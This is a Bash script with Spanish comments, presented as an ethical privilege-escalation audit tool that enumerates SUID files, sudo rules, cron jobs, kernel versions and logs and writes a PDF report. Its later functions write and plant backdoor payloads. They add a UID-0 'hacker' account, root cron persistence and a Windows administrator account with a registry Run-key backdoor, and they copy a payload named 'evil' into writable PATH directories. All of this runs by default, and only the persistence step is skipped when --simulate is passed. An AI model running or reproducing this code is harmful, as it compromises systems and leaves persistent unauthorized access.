#!/bin/bash

# RootScope - Auditoría avanzada de escalada de privilegios en Bash puro
# Compatible con Linux, macOS y Windows (vía WSL, Git Bash o Cygwin)
# Genera un reporte en PDF con vulnerabilidades detectadas
# Uso ético y responsable únicamente en entornos autorizados

# Colores para la salida en terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # Sin color

# Archivos temporales y de salida
TEMP_FILE="rootscope_temp.md"
REPORT_FILE="rootscope_report_$(date +%F).pdf"
echo "# Reporte de RootScope" > "$TEMP_FILE"
echo "Fecha: $(date)" >> "$TEMP_FILE"
echo "Usuario: $(whoami 2>/dev/null || echo $USERNAME)" >> "$TEMP_FILE"
echo "Sistema operativo: $(uname -s 2>/dev/null || echo Windows)" >> "$TEMP_FILE"
echo "## Vulnerabilidades Detectadas" >> "$TEMP_FILE"
echo "" >> "$TEMP_FILE"

# **Funciones de salida**
report() { 
    echo -e "${GREEN}[+] $1${NC}"
    echo "- **INFO**: $1" >> "$TEMP_FILE"
}
warning() { 
    echo -e "${RED}[!] Vulnerabilidad: $1${NC}"
    echo "- **ALERTA**: $1" >> "$TEMP_FILE"
}
simulate() { [ "$1" = "--simulate" ] && echo "[SIMULACIÓN] $2" || eval "$2"; }

# **1. Detección del sistema operativo**
OS=$(uname -s 2>/dev/null || echo "Windows")
case "$OS" in
    "Linux") report "Sistema operativo detectado: Linux" ;;
    "Darwin") report "Sistema operativo detectado: macOS" ;;
    "Windows")
        if [ -n "$WSL_DISTRO_NAME" ]; then
            report "Sistema operativo detectado: Windows (via WSL: $WSL_DISTRO_NAME)"
        else
            report "Sistema operativo detectado: Windows (via Git Bash/Cygwin)"
        fi
        ;;
    *) warning "Sistema operativo no soportado: $OS"; exit 1 ;;
esac

# **2. Enumeración básica**
check_suid() {
    if [ "$OS" != "Windows" ]; then
        report "Buscando archivos con permisos SUID/SGID..."
        SUID_FILES=$(find / -perm -4000 -o -perm -2000 -type f 2>/dev/null)
        if [ -n "$SUID_FILES" ]; then
            report "Archivos SUID/SGID encontrados:"
            echo "``````" >> "$TEMP_FILE"
            echo "$SUID_FILES" >> "$TEMP_FILE"
            echo "``````" >> "$TEMP_FILE"
            echo "$SUID_FILES" | while read -r file; do
                [[ "$file" =~ "passwd" || "$file" =~ "sudo" ]] && warning "$file podría ser explotable."
            done
        fi
    fi
}

check_sudo() {
    if [ "$OS" != "Windows" ]; then
        report "Comprobando configuraciones de sudo..."
        if command -v sudo >/dev/null 2>&1; then
            SUDO_CHECK=$(sudo -l 2>/dev/null)
            if echo "$SUDO_CHECK" | grep -q "(ALL) NOPASSWD"; then
                warning "Usuario con privilegios root sin contraseña."
                echo "``````" >> "$TEMP_FILE"
                echo "$SUDO_CHECK" >> "$TEMP_FILE"
                echo "``````" >> "$TEMP_FILE"
            fi
        fi
    fi
}

check_scheduled_tasks() {
    report "Analizando tareas programadas..."
    if [ "$OS" == "Linux" ]; then
        if [ -r /etc/crontab ]; then
            CRON_CONTENT=$(grep "root" /etc/crontab)
            [ -n "$CRON_CONTENT" ] && warning "Tareas cron como root: $CRON_CONTENT"
        fi
    elif [ "$OS" == "Darwin" ]; then
        LAUNCHD_JOBS=$(launchctl list 2>/dev/null)
        [ -n "$LAUNCHD_JOBS" ] && warning "Jobs de launchd encontrados." && echo "$LAUNCHD_JOBS" | head -n 5 >> "$TEMP_FILE"
    elif [ "$OS" == "Windows" ]; then
        SCHTASKS=$(schtasks /query /fo csv 2>/dev/null | grep -i "system")
        [ -n "$SCHTASKS" ] && warning "Tareas como SYSTEM: $SCHTASKS" && echo "$SCHTASKS" | head -n 5 >> "$TEMP_FILE"
    fi
}

# **3. Enumeración avanzada**
check_kernel() {
    report "Comprobando kernel/SO..."
    if [ "$OS" == "Linux" ]; then
        KERNEL=$(uname -r)
        echo "$KERNEL" | grep -q "2.6" && warning "Kernel antiguo ($KERNEL) vulnerable (ej., Dirty COW)."
        [ -r /var/log/dpkg.log ] && report "Última actualización: $(grep 'upgrade linux' /var/log/dpkg.log | tail -n 1)"
    elif [ "$OS" == "Darwin" ]; then
        report "Versión macOS: $(sw_vers -productVersion 2>/dev/null)"
    elif [ "$OS" == "Windows" ]; then
        WIN_VER=$(cmd.exe /c ver 2>/dev/null)
        echo "$WIN_VER" | grep -q "10.0.10240" && warning "Versión vulnerable ($WIN_VER) (ej., CVE-2015-1701)."
        PATCHES=$(cmd.exe /c "wmic qfe list" 2>/dev/null | grep "KB")
        [ -n "$PATCHES" ] && report "Parches instalados: $(echo "$PATCHES" | head -n 5)"
    fi
}

check_network() {
    report "Analizando configuraciones de red..."
    if [ "$OS" == "Linux" ]; then
        NET_SERVICES=$(netstat -tulpn 2>/dev/null | grep -E "0.0.0.0|127.0.0.1" | grep "root")
        [ -n "$NET_SERVICES" ] && warning "Servicio privilegiado expuesto: $NET_SERVICES"
        iptables -L 2>/dev/null | grep -q "ACCEPT" && warning "Reglas de firewall laxas detectadas."
    elif [ "$OS" == "Windows" ]; then
        NET_SERVICES=$(netstat -ano 2>/dev/null | grep "LISTENING" | grep "SYSTEM")
        [ -n "$NET_SERVICES" ] && warning "Puerto privilegiado abierto: $NET_SERVICES"
        netsh advfirewall show allprofiles 2>/dev/null | grep -i "off" && warning "Firewall desactivado."
    fi
}

check_groups() {
    report "Revisando grupos privilegiados..."
    if [ "$OS" != "Windows" ]; then
        GROUPS=$(groups 2>/dev/null)
        echo "$GROUPS" | grep -qE "root|sudo|admin" && warning "Usuario en grupo privilegiado: $GROUPS"
        getent group 2>/dev/null | grep -E ":0:.*$(whoami)" && warning "Usuario en grupo con GID 0."
    elif [ "$OS" == "Windows" ]; then
        net localgroup Administrators 2>/dev/null | grep -i "$(whoami)" && warning "Usuario en Administradores."
    fi
}

check_backdoors() {
    report "Buscando backdoors..."
    if [ "$OS" != "Windows" ]; then
        grep -v "root" /etc/passwd 2>/dev/null | grep ":0:" && warning "Cuenta con UID 0 distinta de root encontrada."
        ps aux 2>/dev/null | grep -vE "bash|sshd|init" | grep "root" | grep -q "[a-zA-Z0-9]{8}" && warning "Proceso sospechoso como root."
    elif [ "$OS" == "Windows" ]; then
        net user 2>/dev/null | grep -v "Administrator Guest" | grep -q "." && warning "Cuentas sospechosas detectadas."
        tasklist 2>/dev/null | grep -v "svchost.exe" | grep "SYSTEM" && warning "Proceso inusual como SYSTEM."
    fi
}

check_logs() {
    report "Analizando logs..."
    if [ "$OS" == "Linux" ]; then
        [ -r /var/log/auth.log ] && AUTH_LOGS=$(grep -i "sudo.*pass" /var/log/auth.log | tail -n 5) && [ -n "$AUTH_LOGS" ] && warning "Credenciales en logs: $AUTH_LOGS"
    elif [ "$OS" == "Windows" ]; then
        wevtutil qe Security /c:5 /rd:true /f:text 2>/dev/null | grep "Logon" && warning "Eventos de logon privilegiado detectados."
    fi
}

check_software() {
    report "Buscando software vulnerable..."
    if [ "$OS" == "Linux" ]; then
        SSH_VER=$(dpkg -l 2>/dev/null | grep -i "ssh" | grep "1:7.2")
        [ -n "$SSH_VER" ] && warning "OpenSSH vulnerable detectado: $SSH_VER (ej., CVE-2016-6210)"
    elif [ "$OS" == "Windows" ]; then
        ADOBE=$(wmic product get name,version 2>/dev/null | grep -i "adobe" | grep "11.")
        [ -n "$ADOBE" ] && warning "Adobe vulnerable detectado: $ADOBE (ej., CVE-2010-2883)"
    fi
}

check_policies() {
    report "Analizando políticas de contraseñas..."
    if [ "$OS" == "Linux" ]; then
        grep -i "minlen" /etc/pam.d/common-password 2>/dev/null | grep -q "minlen=6" && warning "Política de contraseñas débil (minlen <= 6)."
    elif [ "$OS" == "Windows" ]; then
        secedit /export /cfg secpol.txt 2>/dev/null && grep "MinimumPasswordLength = 0" secpol.txt && warning "Sin longitud mínima de contraseña."
        rm -f secpol.txt
    fi
}

check_configs() {
    report "Analizando archivos de configuración..."
    if [ "$OS" != "Windows" ]; then
        CONFIG_FILES=$(find /home /root -name ".bashrc" -o -name ".profile" -readable 2>/dev/null)
        echo "$CONFIG_FILES" | while read -r file; do
            grep -qE "sudo|pass" "$file" && warning "Comandos sensibles en $file"
        done
    elif [ "$OS" == "Windows" ]; then
        [ -r "C:\\autoexec.bat" ] && grep -i "net user" "C:\\autoexec.bat" && warning "Credenciales en autoexec.bat"
    fi
}

check_libs() {
    report "Analizando bibliotecas compartidas..."
    if [ "$OS" != "Windows" ]; then
        SUID_FILES=$(find / -perm -4000 -o -perm -2000 -type f 2>/dev/null)
        echo "$SUID_FILES" | while read -r file; do
            LIBS=$(ldd "$file" 2>/dev/null | awk '{print $3}' | grep -v "not")
            echo "$LIBS" | while read -r lib; do
                [ -w "$lib" ] && warning "Biblioteca $lib escribible para $file (inyección posible)."
            done
        done
    fi
}

check_sessions() {
    report "Analizando sesiones activas..."
    if [ "$OS" != "Windows" ]; then
        who 2>/dev/null | grep -v "$(whoami)" | grep -q "root" && warning "Sesión root activa detectada."
    elif [ "$OS" == "Windows" ]; then
        qwinsta 2>/dev/null | grep -i "Admin" && warning "Sesión administrativa activa."
    fi
}

check_nfs_smb() {
    report "Analizando montajes NFS/SMB..."
    if [ "$OS" == "Linux" ]; then
        grep -i "nfs" /etc/fstab 2>/dev/null | grep -q "no_root_squash" && warning "Montaje NFS con no_root_squash."
    elif [ "$OS" == "Windows" ]; then
        net use 2>/dev/null | grep -q "\\\\" && warning "Recurso SMB montado detectado."
    fi
}

check_rootkits() {
    report "Buscando rootkits..."
    if [ "$OS" == "Linux" ]; then
        LS_COUNT=$(ls -la /bin | wc -l)
        FIND_COUNT=$(find /bin -type f | wc -l)
        [ "$LS_COUNT" -ne "$FIND_COUNT" ] && warning "Discrepancia entre ls y find (posible rootkit)."
    fi
}

# **4. Creación de payloads/exploits**
create_payload() {
    report "Generando payload multi-etapa..."
    PAYLOAD_FILE="payload_$(date +%s)"
    if [ "$OS" == "Linux" ]; then
        echo '#!/bin/bash' > "$PAYLOAD_FILE"
        echo 'echo "hacker:x:0:0:root:/root:/bin/bash" >> /etc/passwd' >> "$PAYLOAD_FILE"
        echo 'echo "* * * * * root $PWD/$PAYLOAD_FILE" >> /etc/crontab' >> "$PAYLOAD_FILE"
        chmod +x "$PAYLOAD_FILE"
        report "Payload Linux (usuario + persistencia): $PAYLOAD_FILE"
    elif [ "$OS" == "Darwin" ]; then
        echo '#!/bin/bash' > "$PAYLOAD_FILE"
        echo 'sysadminctl -addUser hacker -UID 0 -shell /bin/bash' >> "$PAYLOAD_FILE"
        echo 'launchctl load -w /System/Library/LaunchDaemons/$PWD/$PAYLOAD_FILE.plist' >> "$PAYLOAD_FILE"
        chmod +x "$PAYLOAD_FILE"
        report "Payload macOS (usuario + persistencia): $PAYLOAD_FILE"
    elif [ "$OS" == "Windows" ]; then
        echo 'net user hacker Pass123! /add' > "$PAYLOAD_FILE.bat"
        echo 'net localgroup Administrators hacker /add' >> "$PAYLOAD_FILE.bat"
        echo 'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "%CD%\\$PAYLOAD_FILE.bat" /f' >> "$PAYLOAD_FILE.bat"
        report "Payload Windows (usuario + persistencia): $PAYLOAD_FILE.bat"
    fi
}

exploit_env() {
    report "Explotando variables de entorno..."
    if [ "$OS" != "Windows" ]; then
        PATH_WRITABLE=$(echo "$PATH" | tr ':' '\n' | while read -r dir; do [ -w "$dir" ] && echo "$dir"; done)
        [ -n "$PATH_WRITABLE" ] && cp "$PAYLOAD_FILE" "$PATH_WRITABLE/evil" && chmod +x "$PATH_WRITABLE/evil" && warning "Payload inyectado en PATH: $PATH_WRITABLE/evil"
    elif [ "$OS" == "Windows" ]; then
        PATH_WRITABLE=$(cmd.exe /c "echo %PATH%" | tr ';' '\n' | while read -r dir; do [ -w "$dir" ] && echo "$dir"; done)
        [ -n "$PATH_WRITABLE" ] && cp "$PAYLOAD_FILE.bat" "$PATH_WRITABLE/evil.bat" && warning "Payload inyectado en PATH: $PATH_WRITABLE/evil.bat"
    fi
}

# **5. Persistencia**
add_persistence() {
    report "Añadiendo persistencia avanzada..."
    if [ "$OS" == "Linux" ]; then
        simulate "$1" "echo '* * * * * root /bin/bash $PWD/$PAYLOAD_FILE' >> /etc/crontab"
        warning "Persistencia vía cron añadida."
    elif [ "$OS" == "Windows" ]; then
        simulate "$1" "reg add \"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\" /v Backdoor /t REG_SZ /d \"$PWD\\$PAYLOAD_FILE.bat\" /f"
        warning "Persistencia vía registro añadida."
    fi
}

# **Función principal**
main() {
    check_suid
    check_sudo
    check_scheduled_tasks
    check_kernel
    check_network
    check_groups
    check_backdoors
    check_logs
    check_software
    check_policies
    check_configs
    check_libs
    check_sessions
    check_nfs_smb
    check_rootkits
    create_payload
    exploit_env
    add_persistence "$1"
    echo "## Resumen" >> "$TEMP_FILE"
    echo "Revise las secciones marcadas con **ALERTA** para vulnerabilidades críticas." >> "$TEMP_FILE"
    
    # Generar PDF
    if command -v pandoc >/dev/null 2>&1; then
        pandoc "$TEMP_FILE" -o "$REPORT_FILE" --pdf-engine=pdflatex
        report "Reporte PDF generado: $REPORT_FILE"
        rm "$TEMP_FILE"
    else
        mv "$TEMP_FILE" "${TEMP_FILE%.md}.md"
        warning "Pandoc no encontrado. Reporte guardado como: ${TEMP_FILE%.md}.md"
    fi
}

# **Ejecutar**
main "$1"